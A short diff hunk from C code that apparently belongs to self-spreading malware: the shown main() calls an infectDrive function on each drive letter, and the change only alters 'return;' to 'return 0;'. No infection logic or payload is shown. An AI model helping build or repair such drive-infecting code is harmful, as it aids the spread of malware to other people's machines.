@@ -84,7 +84,7 @@ int main(){
             infectDrive(driveLetter);
         }
     }
-    return; // :)
+    return 0; // :)
 }
 
 /**
